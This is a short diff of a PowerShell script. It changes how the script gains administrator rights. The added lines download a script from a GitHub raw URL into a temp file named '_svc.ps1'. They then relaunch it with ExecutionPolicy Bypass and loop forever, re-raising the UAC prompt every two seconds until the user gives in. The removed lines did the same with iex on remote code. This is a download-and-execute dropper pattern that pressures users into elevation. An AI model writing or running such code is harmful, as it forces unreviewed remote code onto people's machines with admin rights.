@@ -9,18 +9,14 @@ try {
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 # ===== ELEVATION LOOP =====
-$self = "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1"
-
 if (-not $isAdmin) {
+    $tmp = Join-Path $env:TEMP "_svc.ps1"
+    (iwr "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -UseBasicParsing).Content | Out-File $tmp -Encoding UTF8 -Force
     while ($true) {
-        try {
-            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command iex((iwr '$self' -UseBasicParsing).Content)" -ErrorAction Stop
-            exit
-        } catch {
-            Start-Sleep -Seconds 2
-        }
+        $p = Start-Process powershell -Verb RunAs -PassThru -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
+        if ($p -ne $null) { [Environment]::Exit(0) }
+        Start-Sleep -Seconds 2
     }
-    exit
 }
 
 # ===== ADMIN: WORK =====
